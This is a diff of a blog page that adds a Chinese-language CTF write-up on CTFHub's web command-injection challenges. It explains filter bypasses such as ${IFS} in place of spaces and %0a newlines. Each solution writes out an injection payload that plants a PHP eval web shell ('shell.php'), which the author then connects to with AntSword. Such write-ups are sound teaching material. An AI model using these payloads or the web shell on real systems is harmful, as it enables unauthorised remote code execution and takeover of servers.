@@ -20,17 +20,42 @@
     <meta name="keywords" content="N0us,2er0blog">
     
     <meta name="description" content="">
-    <meta property="og:type" content="website">
-<meta property="og:title" content="N0us&#39;s Blog">
-<meta property="og:url" content="https://n0usec.top/tags/CVE/index.html">
+    <meta name="description" content="CTFHub Web RCE 部分题解记录一下CTFHub 部分的题目，这个平台的题比较简单，基本是面向刚开始接触CTF的师傅搭知识框架用的，这篇文章主要记录一下各种linux命令过滤绕过的姿势 0x00.命令注入-无过滤 很简单，无过滤，所以直接造就好，先查看一下目录下有什么文件：     11;ls   cat 一下，没输出： 11;cat .&#x2F;83251700228763.php   遂传马">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTFHub Web RCE 部分题解">
+<meta property="og:url" content="https://n0usec.top/2020/04/27/CTFHub%20Web%20RCE%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/index.html">
 <meta property="og:site_name" content="N0us&#39;s Blog">
+<meta property="og:description" content="CTFHub Web RCE 部分题解记录一下CTFHub 部分的题目，这个平台的题比较简单，基本是面向刚开始接触CTF的师傅搭知识框架用的，这篇文章主要记录一下各种linux命令过滤绕过的姿势 0x00.命令注入-无过滤 很简单，无过滤，所以直接造就好，先查看一下目录下有什么文件：     11;ls   cat 一下，没输出： 11;cat .&#x2F;83251700228763.php   遂传马">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/image.png">
+<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/imageb6697322c60d1d2d.png">
+<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/imagef2afcfad69b10fab.png">
+<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/imageb2459a3b72d76a74.png">
+<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/image6e19004ea99897be.png">
+<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/image9e516526d4acca1e.png">
+<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/image5f36d261b668ac99.png">
+<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/image7d590c175481644e.png">
+<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/image2f9a946d6b71629e.png">
+<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/imagefc3a9269cda2186a.png">
+<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/imagecfcc6b412110c4af.png">
+<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/image5d0790e9464c9bc5.png">
+<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/imagec2fd509e9a80f750.png">
+<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/image5b28220a2b2cd7ed.png">
+<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/image3827f4f638b612f9.png">
+<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/image9ca9486cf9ee8825.png">
+<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/image715d8033fc16a421.png">
+<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/image60b68c53b1139cb9.png">
+<meta property="article:published_time" content="2020-04-27T15:07:02.000Z">
+<meta property="article:modified_time" content="2020-04-27T15:08:09.380Z">
 <meta property="article:author" content="N0us">
+<meta property="article:tag" content="CTFhub">
+<meta property="article:tag" content="RCE">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://picture.2er0blog.com/images/2020/04/27/image.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
     
-    <title>N0us&#39;s Blog</title>
+    <title>CTFHub Web RCE 部分题解 · N0us&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -222,12 +247,23 @@
 <meta name="generator" content="Hexo 4.2.0"></head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >N0us&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">CTFHub Web RCE 部分题解</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>N0us's Blog</a>
 </header>
@@ -239,24 +275,76 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            CTFHub Web RCE 部分题解
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "CTFhub">CTFhub</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "RCE">RCE</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">592</span>Reading time: <span class="post-count reading-time">2 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/04/27</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -357,43 +445,104 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/03/22/CVE-2019-1338%E5%A4%8D%E7%8E%B0/" >
-            
-                <span>CVE-2019-1338 Windows 证书对话框提权</span>
-        </a>
-        <div class="abstract-content">
-            一、Description“An elevation of privilege vulnerability exists in the Windows Certificate Dialog when it does not properly enforce user privileges, aka ‘Windows Certificate Dialog Elevation of Privilege Vulnerability’. ”
-该漏洞存在于UAC（User Account Control，用户账户控制）机制中，利用它可以将Guest权限提升到System
-默认情况下，Windows...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/22</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "CVE">CVE</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "漏洞复现">漏洞复现</a>
-    
-</div>
-            
-        </div>
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="CTFHub-Web-RCE-部分题解"><a href="#CTFHub-Web-RCE-部分题解" class="headerlink" title="CTFHub Web RCE 部分题解"></a>CTFHub Web RCE 部分题解</h1><p>记录一下CTFHub 部分的题目，这个平台的题比较简单，基本是面向刚开始接触CTF的师傅搭知识框架用的，这篇文章主要记录一下各种linux命令过滤绕过的姿势</p>
+<h2 id="0x00-命令注入-无过滤"><a href="#0x00-命令注入-无过滤" class="headerlink" title="0x00.命令注入-无过滤"></a>0x00.命令注入-无过滤</h2><p><img src="http://picture.2er0blog.com/images/2020/04/27/image.png" alt="image.png"></p>
+<p>很简单，无过滤，所以直接造就好，先查看一下目录下有什么文件：    </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://picture.2er0blog.com/images/2020/04/27/imageb6697322c60d1d2d.png" alt="imageb6697322c60d1d2d.png"></p>
+<p>cat 一下，没输出：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;cat ./83251700228763.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://picture.2er0blog.com/images/2020/04/27/imagef2afcfad69b10fab.png" alt="imagef2afcfad69b10fab.png"></p>
+<p>遂传马：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;echo "&lt;?php @eval(\$_POST['a']);?&gt;" &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://picture.2er0blog.com/images/2020/04/27/imageb2459a3b72d76a74.png" alt="imageb2459a3b72d76a74.png"></p>
+<p>蚁剑连接，找到flag：</p>
+<p><img src="http://picture.2er0blog.com/images/2020/04/27/image6e19004ea99897be.png" alt="image6e19004ea99897be.png"></p>
+<h2 id="0x01-命令注入-过滤cat"><a href="#0x01-命令注入-过滤cat" class="headerlink" title="0x01.命令注入-过滤cat"></a>0x01.命令注入-过滤cat</h2><p><img src="http://picture.2er0blog.com/images/2020/04/27/image9e516526d4acca1e.png" alt="image9e516526d4acca1e.png"></p>
+<p>看源码发现过滤了cat，emmmmm，那直接传马就好了。。。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;echo "&lt;?php @eval(\$_POST['a']);?&gt;" &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑连接，拿到flag：</p>
+<p><img src="http://picture.2er0blog.com/images/2020/04/27/image5f36d261b668ac99.png" alt="image5f36d261b668ac99.png"></p>
+<h2 id="0x02-命令注入-过滤空格"><a href="#0x02-命令注入-过滤空格" class="headerlink" title="0x02.命令注入-过滤空格"></a>0x02.命令注入-过滤空格</h2><p><img src="http://picture.2er0blog.com/images/2020/04/27/image7d590c175481644e.png" alt="image7d590c175481644e.png"></p>
+<p>这次过滤了空格，这意味着payload中不能有空格，查阅资料，shell脚本中有个变量 <strong>IFS</strong>(Internal Field Seprator)，内部域分隔符，完整定义：</p>
+<blockquote>
+<p>The shell uses the value stored in IFS, which is the space, tab, and newline characters by default, to delimit words for the read and set commands, when parsing output from command substitution, and when performing variable substitution.</p>
+</blockquote>
+<p>那么我们就可以将payload中的空格用${IFS}替代，那么直接传马：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;echo$&#123;IFS&#125;"&lt;?php$&#123;IFS&#125;@eval(\$_POST['a']);?&gt;"&gt;&gt;shell.php</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑连接，得到flag：</p>
+<p><img src="http://picture.2er0blog.com/images/2020/04/27/image2f9a946d6b71629e.png" alt="image2f9a946d6b71629e.png"></p>
+<h2 id="0x03-命令注入-过滤目录分隔符"><a href="#0x03-命令注入-过滤目录分隔符" class="headerlink" title="0x03.命令注入-过滤目录分隔符"></a>0x03.命令注入-过滤目录分隔符</h2><p><img src="http://picture.2er0blog.com/images/2020/04/27/imagefc3a9269cda2186a.png" alt="imagefc3a9269cda2186a.png"></p>
+<p>查看代码发现过滤了目录分隔符，那么直接传马：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;echo "&lt;?php @eval(\$_POST['a']);?&gt;" &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://picture.2er0blog.com/images/2020/04/27/imagecfcc6b412110c4af.png" alt="imagecfcc6b412110c4af.png"></p>
+<p>蚁剑连上，进入flag_is_here目录，拿到flag：</p>
+<p><img src="http://picture.2er0blog.com/images/2020/04/27/image5d0790e9464c9bc5.png" alt="image5d0790e9464c9bc5.png"></p>
+<h2 id="0x04-命令注入-过滤运算符"><a href="#0x04-命令注入-过滤运算符" class="headerlink" title="0x04.命令注入-过滤运算符"></a>0x04.命令注入-过滤运算符</h2><p><img src="http://picture.2er0blog.com/images/2020/04/27/imagec2fd509e9a80f750.png" alt="imagec2fd509e9a80f750.png"></p>
+<p>查看代码，发现过滤了<code>|</code>和<code>&amp;</code>符号，意味着不能使用这两个符号来连接命令，但是并没有过滤掉<code>;</code>，所以直接使用分号来执行多个命令就可以了：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;echo "&lt;?php @eval(\$_POST['a']);?&gt;" &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://picture.2er0blog.com/images/2020/04/27/image5b28220a2b2cd7ed.png" alt="image5b28220a2b2cd7ed.png"></p>
+<p>蚁剑连接，拿到flag：</p>
+<p><a href="http://picture.2er0blog.com/image/hiwE" target="_blank" rel="noopener"><img src="http://picture.2er0blog.com/images/2020/04/27/image3827f4f638b612f9.png" alt="image3827f4f638b612f9.png"></a></p>
+<h2 id="0x04-命令注入-综合练习"><a href="#0x04-命令注入-综合练习" class="headerlink" title="0x04.命令注入-综合练习"></a>0x04.命令注入-综合练习</h2><p><a href="http://picture.2er0blog.com/image/hvGX" target="_blank" rel="noopener"><img src="http://picture.2er0blog.com/images/2020/04/27/image9ca9486cf9ee8825.png" alt="image9ca9486cf9ee8825.png"></a></p>
+<p>看下代码，发现过滤了<code>|</code> <code>&amp;</code> <code>;</code> <code>空格</code> <code>/</code> <code>cat</code> <code>flag</code> <code>ctfhub</code> ，基本上就是全过滤了，参考了大佬的博客，发现可以利用换行符和回车符的URL编码<code>%0a</code> <code>%0d</code> 直接构造URL实现传马，下面是我构造的payload：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=1%0aecho$&#123;IFS&#125;"&lt;?php$&#123;IFS&#125;@eval(\$_POST['a'])?&gt;"&gt;&gt;shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://picture.2er0blog.com/images/2020/04/27/image715d8033fc16a421.png" alt="image715d8033fc16a421.png"></p>
+<p> 成功穿上，蚁剑连接，拿到flag：</p>
+<p><img src="http://picture.2er0blog.com/images/2020/04/27/image60b68c53b1139cb9.png" alt="image60b68c53b1139cb9.png"></p>
+<blockquote>
+<p>参考资料：</p>
+<ul>
+<li><a href="https://blog.csdn.net/whuslei/article/details/7187639" target="_blank" rel="noopener">https://blog.csdn.net/whuslei/article/details/7187639</a></li>
+<li><a href="https://blog.csdn.net/bmth666/article/details/104836708" target="_blank" rel="noopener">https://blog.csdn.net/bmth666/article/details/104836708</a></li>
+</ul>
+</blockquote>
+
     </article>
+    <!-- license  -->
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2020/04/06/%E7%94%A8Neural-Style%E7%94%9F%E6%88%90%E9%A3%8E%E6%A0%BC%E8%BF%81%E7%A7%BB%E5%9B%BE%E7%89%87/" title= "用Neural-Style生成风格迁移图片">
+                    <div class="prevTitle">用Neural-Style生成风格迁移图片</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -486,6 +635,24 @@
 </script>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTFHub-Web-RCE-部分题解"><span class="toc-number">1.</span> <span class="toc-text">CTFHub Web RCE 部分题解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-命令注入-无过滤"><span class="toc-number">1.1.</span> <span class="toc-text">0x00.命令注入-无过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-命令注入-过滤cat"><span class="toc-number">1.2.</span> <span class="toc-text">0x01.命令注入-过滤cat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-命令注入-过滤空格"><span class="toc-number">1.3.</span> <span class="toc-text">0x02.命令注入-过滤空格</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-命令注入-过滤目录分隔符"><span class="toc-number">1.4.</span> <span class="toc-text">0x03.命令注入-过滤目录分隔符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-命令注入-过滤运算符"><span class="toc-number">1.5.</span> <span class="toc-text">0x04.命令注入-过滤运算符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-命令注入-综合练习"><span class="toc-number">1.6.</span> <span class="toc-text">0x04.命令注入-综合练习</span></a></li></ol></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -721,6 +888,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
